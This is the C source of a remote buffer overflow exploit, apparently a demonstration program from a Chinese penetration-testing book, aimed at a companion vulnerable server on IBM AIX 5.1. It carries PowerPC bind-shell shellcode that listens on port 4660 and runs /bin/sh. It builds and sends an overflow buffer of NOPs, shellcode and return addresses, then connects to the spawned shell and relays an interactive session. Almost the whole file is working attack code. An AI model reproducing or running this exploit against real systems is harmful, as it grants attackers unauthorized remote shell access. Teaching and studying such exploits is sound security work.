/* client.c -  remote overflow demo
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  针对server.c的利用程序。
*  测试环境：IBM AIX 5.1
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

// It needs adjust.
#define RET 0x2ff22d88;

unsigned char sh_Buff[] =
    "\x7e\x94\xa2\x79"     /* xor.    r20,r20,r20            */
    "\x40\x82\xff\xfd"     /* bnel    <syscallcode>          */
    "\x7e\xa8\x02\xa6"     /* mflr    r21                    */
    "\x3a\xc0\x01\xff"     /* lil     r22,0x1ff              */
    "\x3a\xf6\xfe\x2d"     /* cal     r23,-467(r22)          */
    "\x7e\xb5\xba\x14"     /* cax     r21,r21,r23            */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x20"     /* bctr                           */

    "\x05\x82\x53\xa0"     /* syscall numbers                */
    "\x87\xa0\x01\x42"     /* execve=0x05 close=0xa0         */
    "\x8d\x8c\x8b\x8a"     /* socket=0x8d bind=0x8c          */
                           /* listen=0x8b naccept=0x8a       */
                           /* kfcntl=0x142                   */

    "\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6            */
    "\x44\xff\xff\x02"     /* svca    0x0                    */
    "\x3a\xb5\xff\xf8"     /* cal     r21,-8(r21)            */

    "\x2c\x74\x12\x34"     /* cmpi    cr0,r20,0x1234         */
    "\x41\x82\xff\xfd"     /* beql    <bindsckcode>          */
    "\x7f\x08\x02\xa6"     /* mflr    r24                    */
    "\x92\x98\xff\xfc"     /* st      r20,-4(r24)            */
    "\x38\x76\xfe\x03"     /* cal     r3,-509(r22)           */
    "\x38\x96\xfe\x02"     /* cal     r4,-510(r22)           */
    "\x98\x78\xff\xf9"     /* stb     r3,-7(r24)             */
    "\x7e\x85\xa3\x78"     /* mr      r5,r20                 */
    "\x88\x55\xff\xfc"     /* lbz     r2,-4(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x7c\x79\x1b\x78"     /* mr      r25,r3                 */
    "\x38\x98\xff\xf8"     /* cal     r4,-8(r24)             */
    "\x38\xb6\xfe\x11"     /* cal     r5,-495(r22)           */
    "\x88\x55\xff\xfd"     /* lbz     r2,-3(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x7f\x23\xcb\x78"     /* mr      r3,r25                 */
    "\x38\x96\xfe\x06"     /* cal     r4,-506(r22)           */
    "\x88\x55\xff\xfe"     /* lbz     r2,-2(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x7f\x23\xcb\x78"     /* mr      r3,r25                 */
    "\x7e\x84\xa3\x78"     /* mr      r4,r20                 */
    "\x7e\x85\xa3\x78"     /* mr      r5,r20                 */
    "\x88\x55\xff\xff"     /* lbz     r2,-1(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x7c\x79\x1b\x78"     /* mr      r25,r3                 */
    "\x3b\x56\xfe\x03"     /* cal     r26,-509(r22)          */
    "\x7f\x43\xd3\x78"     /* mr      r3,r26                 */
    "\x88\x55\xff\xf7"     /* lbz     r2,-9(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x7f\x23\xcb\x78"     /* mr      r3,r25                 */
    "\x7e\x84\xa3\x78"     /* mr      r4,r20                 */
    "\x7f\x45\xd3\x78"     /* mr      r5,r26                 */
    "\xa0\x55\xff\xfa"     /* lhz     r2,-6(r21)             */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x21"     /* bctrl                          */
    "\x37\x5a\xff\xff"     /* ai.     r26,r26,-1             */
    "\x40\x80\xff\xd4"     /* bge     <bindsckcode+120>      */

    "\x7c\xa5\x2a\x79"     /* xor.    r5,r5,r5               */
    "\x40\x82\xff\xfd"     /* bnel    <shellcode>            */
    "\x7f\xe8\x02\xa6"     /* mflr    r31                    */
    "\x3b\xff\x01\x20"     /* cal     r31,0x120(r31)         */
    "\x38\x7f\xff\x08"     /* cal     r3,-248(r31)           */
    "\x38\x9f\xff\x10"     /* cal     r4,-240(r31)           */
    "\x90\x7f\xff\x10"     /* st      r3,-240(r31)           */
    "\x90\xbf\xff\x14"     /* st      r5,-236(r31)           */
    "\x88\x55\xff\xf4"     /* lbz     r2,-12(r21)            */
    "\x98\xbf\xff\x0f"     /* stb     r5,-241(r31)           */
    "\x7e\xa9\x03\xa6"     /* mtctr   r21                    */
    "\x4e\x80\x04\x20"     /* bctr                           */
    "/bin/sh"
;

// ripped from isno
int Make_Connection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    int s,i,bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        close(s);
        return -2;
    }
    target.sin_port = htons(port);
    bf = 1;
    ioctl(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        close(s);
        return -3;
    }
    if(i==0)
    {
        close(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        close(s);
        return -5;
    }
    ioctl(s,FIONBIO,&bf);
    return s;
}

/* ripped from TESO code */
void shell (int sock)
{
    int     l;
    char    buf[512];
    fd_set  rfds;

    while (1) {
        FD_SET (0, &rfds);
        FD_SET (sock, &rfds);

        select (sock + 1, &rfds, NULL, NULL, NULL);

        if (FD_ISSET (0, &rfds)) {
            l = read (0, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read user");
                exit (EXIT_FAILURE);
            }
            write (sock, buf, l);
        }

        if (FD_ISSET (sock, &rfds)) {
            l = read (sock, buf, sizeof (buf));
            if (l <= 0) {
                perror ("read remote");
                exit (EXIT_FAILURE);
            }
            write (1, buf, l);
        }
    }
}

void PrintSc(unsigned char *lpBuff, int buffsize)
{
    int i,j;
    char *p;
    char msg[4];
    fprintf(stderr, "/* %d bytes */\n",buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%4)==0)
            if(i!=0)
                fprintf(stderr, "\"\n\"");
            else
                fprintf(stderr, "\"");
        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                fprintf(stderr, "%c", _tolower(*p));
            else
                fprintf(stderr, "%c", p[0]);
        }
    }
    fprintf(stderr, "\";\n");
}

int main(int argc, char *argv[]) { 
    unsigned char Buff[1024];

    unsigned long *ps;
    int s, i, k;

    if (argc < 3) {
        fprintf(stderr, "Usage: %s remote_ip remote_port\n", argv[0]);
        return -1;
    }

    // 建立连接
    s = Make_Connection(argv[1], atoi(argv[2]), 10);
    if (!s) {
        fprintf(stderr, "[-] Connect failed. \n");
        return -1;
    }

    // 构造攻击Buff
    ps = (unsigned long *)Buff;
    for(i=0; i<sizeof(Buff)/4; i++)
    {
        *(ps++) = 0x60000000;
    }
    
    i = sizeof(sh_Buff) % 4;
    
    memcpy(&Buff[sizeof(Buff) - sizeof(sh_Buff) - i], sh_Buff, sizeof(sh_Buff));

    ps = (unsigned long *)Buff;
    for(i=0; i<92/4; i++)
    {
        *(ps++) = RET;
    }
    Buff[sizeof(Buff) - 1] = 0;
    
    PrintSc(Buff, sizeof(Buff));

    // 发送构造的Buff
    i = send(s, Buff, sizeof(Buff), 0);
    if (i <= 0) {
        fprintf(stderr, "[-] Send failed. \n");
        return -1;
    }

    sleep (1);
    
    k = Make_Connection(argv[1], 4660, 10);
    if (!k) {
        fprintf(stderr, "[-] Connect failed. \n");
        return -1;
    }

    shell(k);

}
